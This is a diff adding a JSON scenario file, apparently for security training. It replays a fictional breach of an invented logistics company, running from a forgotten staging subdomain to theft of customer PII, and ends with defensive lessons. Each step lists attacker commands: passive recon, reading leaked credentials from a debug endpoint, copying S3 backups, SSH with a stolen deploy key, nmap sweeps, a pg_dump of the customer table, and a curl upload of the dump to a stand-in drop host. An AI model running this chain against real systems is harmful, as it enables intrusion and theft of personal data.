@@ -1,0 +1,97 @@
+{
+  "slug": "northwind-shadow-it-breach",
+  "title": "Shadow IT to Customer Data at Northwind",
+  "subtitle": "A fictional external-to-internal breach for training",
+  "category": "Incident Replay",
+  "difficulty": "intermediate",
+  "estimatedMinutes": 15,
+  "fictional": true,
+  "clusters": 310,
+  "disclaimer": "Fictional training scenario. Northwind Logistics is an invented company; all hosts, buckets, and timestamps are made up. It exists to show how an ordinary attack-surface gap — one forgotten subdomain — can chain all the way to customer data.",
+  "summary": "Northwind Logistics thought its attack surface was small. It wasn't. This fictional replay follows an attacker who starts with nothing but the company name, finds a **forgotten staging subdomain** in certificate-transparency logs, and chains a debug endpoint → a world-readable cloud backup → a leaked CI deploy key → a flat internal network, ending at the customer database. Every link is a routine ASM finding. Press play to watch a small oversight become a breach.",
+  "stages": [
+    { "id": "stage-1", "name": "External discovery & initial access", "note": "passive recon into a forgotten host" },
+    { "id": "stage-2", "name": "Cloud pivot & internal movement", "note": "backup → deploy key → flat network" }
+  ],
+  "phases": [
+    { "id": "recon", "label": "recon", "note": "passive discovery — CT logs, DNS", "total": 1200 },
+    { "id": "initial-access", "label": "initial-access", "note": "exposed debug endpoint", "total": 400 },
+    { "id": "cloud", "label": "cloud", "note": "public storage enumeration", "total": 500 },
+    { "id": "cred-access", "label": "cred-access", "note": "leaked keys in backups", "total": 300 },
+    { "id": "lateral", "label": "lateral", "note": "flat-network movement", "total": 700 },
+    { "id": "exfil", "label": "exfil", "note": "customer PII theft", "total": 300 }
+  ],
+  "nodes": [
+    { "id": "ct-logs", "stageId": "stage-1", "group": "Public internet", "label": "Certificate transparency", "sub": "forgotten subdomains" },
+    { "id": "staging-app", "stageId": "stage-1", "group": "Northwind perimeter", "label": "staging-payments.northwind", "sub": "debug endpoint exposed" },
+    { "id": "s3-bucket", "stageId": "stage-2", "group": "Northwind cloud", "label": "Backup bucket", "sub": "world-readable" },
+    { "id": "ci-runner", "stageId": "stage-2", "group": "Northwind CI/CD", "label": "CI runner", "sub": "leaked deploy key" },
+    { "id": "vpc-internal", "stageId": "stage-2", "group": "Northwind internal network", "label": "Internal services", "sub": "flat network" },
+    { "id": "db", "stageId": "stage-2", "group": "Northwind internal network", "label": "Customer database", "sub": "PII" }
+  ],
+  "edges": [
+    { "from": "ct-logs", "to": "staging-app", "label": "forgotten host" },
+    { "from": "staging-app", "to": "s3-bucket", "label": "creds in debug" },
+    { "from": "s3-bucket", "to": "ci-runner", "label": "deploy key" },
+    { "from": "ci-runner", "to": "vpc-internal", "label": "runner in VPC" },
+    { "from": "vpc-internal", "to": "db", "label": "flat network" }
+  ],
+  "events": [
+    {
+      "id": "e01", "t": "2026-03-15T08:00:00Z", "phaseId": "recon", "stageId": "stage-1", "actions": 700,
+      "title": "Certificate-transparency sweep", "blastRadius": "public internet", "ignites": ["ct-logs"],
+      "detail": "Starting from just the company name, the attacker queries certificate-transparency logs and passive DNS for anything ending in northwind.example — no packet ever touches Northwind.",
+      "commands": ["curl -s 'https://crt.sh/?q=%25.northwind.example&output=json'", "amass enum -passive -d northwind.example"]
+    },
+    {
+      "id": "e02", "t": "2026-03-15T08:40:00Z", "phaseId": "recon", "stageId": "stage-1", "actions": 500,
+      "title": "A forgotten staging host", "blastRadius": "public internet", "ignites": ["staging-app"],
+      "detail": "One certificate stands out: staging-payments.northwind.example, issued months ago and never decommissioned. httpx confirms it is live and serving a debug build.",
+      "commands": ["echo staging-payments.northwind.example | httpx -title -tech-detect -status-code", "curl -s https://staging-payments.northwind.example/ | grep -i debug"]
+    },
+    {
+      "id": "e03", "t": "2026-03-15T09:20:00Z", "phaseId": "initial-access", "stageId": "stage-1", "actions": 400,
+      "title": "Debug endpoint exposed", "blastRadius": "Northwind perimeter",
+      "detail": "The staging build left a debug endpoint enabled that echoes environment variables — including a set of cloud credentials that were never supposed to leave CI.",
+      "commands": ["curl -s https://staging-payments.northwind.example/__debug/env", "# AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY in the response"]
+    },
+    {
+      "id": "e04", "t": "2026-03-15T10:05:00Z", "phaseId": "cloud", "stageId": "stage-2", "actions": 500,
+      "title": "World-readable backup bucket", "blastRadius": "Northwind cloud", "ignites": ["s3-bucket"],
+      "detail": "The leaked credentials list an S3 bucket of nightly backups — and its bucket policy is world-readable. The attacker downloads a database backup and a CI configuration archive.",
+      "commands": ["aws s3 ls s3://northwind-backups/", "aws s3 cp s3://northwind-backups/ci/ . --recursive"]
+    },
+    {
+      "id": "e05", "t": "2026-03-15T10:50:00Z", "phaseId": "cred-access", "stageId": "stage-2", "actions": 300,
+      "title": "Deploy key in the backup", "blastRadius": "Northwind CI/CD", "ignites": ["ci-runner"],
+      "detail": "Inside the CI archive is a long-lived deploy key. It grants access to the CI runner — a machine that, unlike the perimeter, lives inside the corporate VPC.",
+      "commands": ["grep -R 'BEGIN OPENSSH PRIVATE KEY' ci/", "ssh -i ./deploy_key runner@ci.northwind.internal"]
+    },
+    {
+      "id": "e06", "t": "2026-03-15T11:30:00Z", "phaseId": "lateral", "stageId": "stage-2", "actions": 400,
+      "title": "A foothold inside the VPC", "blastRadius": "Northwind internal network", "ignites": ["vpc-internal"],
+      "detail": "The CI runner sits on a flat internal network with no segmentation between build infrastructure and production services. From here everything internal is reachable.",
+      "commands": ["ip a; ip route", "nmap -sn 10.0.0.0/16"]
+    },
+    {
+      "id": "e07", "t": "2026-03-15T12:10:00Z", "phaseId": "lateral", "stageId": "stage-2", "actions": 300,
+      "title": "Flat network to the database", "blastRadius": "Northwind internal network", "ignites": ["db"],
+      "detail": "The customer database accepts connections from anything in the VPC. The same credentials from the debug endpoint work here too — they were reused.",
+      "commands": ["nmap -p 5432 --open 10.0.0.0/16", "psql -h db.northwind.internal -U svc_payments -d customers"]
+    },
+    {
+      "id": "e08", "t": "2026-03-15T12:45:00Z", "phaseId": "exfil", "stageId": "stage-2", "actions": 300,
+      "title": "Customer PII exfiltration", "blastRadius": "Northwind internal network",
+      "detail": "The attacker dumps the customer table and exfiltrates it. Elapsed time from 'just the company name' to customer data: under five hours.",
+      "commands": ["pg_dump -h db.northwind.internal -U svc_payments -t customers customers > out.sql", "curl -T out.sql https://drop.example/<id>"]
+    }
+  ],
+  "lessons": [
+    "Attack surface is what you forgot, not what you remember. staging-payments was a real host with a real certificate that nobody was watching — certificate-transparency monitoring would have flagged it the day it was issued.",
+    "Debug endpoints that echo environment variables are credential leaks waiting to happen. Ship builds with debug disabled, and never put production credentials in a staging environment.",
+    "A public storage bucket turns one leaked key into a data breach. Enforce block-public-access at the account level and treat every backup as if it contains the crown jewels — because it does.",
+    "Long-lived deploy keys in backups chain cloud access into network access. Use short-lived, scoped credentials, and keep secrets out of anything that gets backed up in the clear.",
+    "A flat network means one foothold equals full reach. Segment build infrastructure from production, and don't let a CI runner talk to the customer database.",
+    "Every link here was a routine ASM finding — a forgotten subdomain, an open bucket, a reused credential. Continuous discovery catches these while they are still just findings, not incident timelines."
+  ]
+}
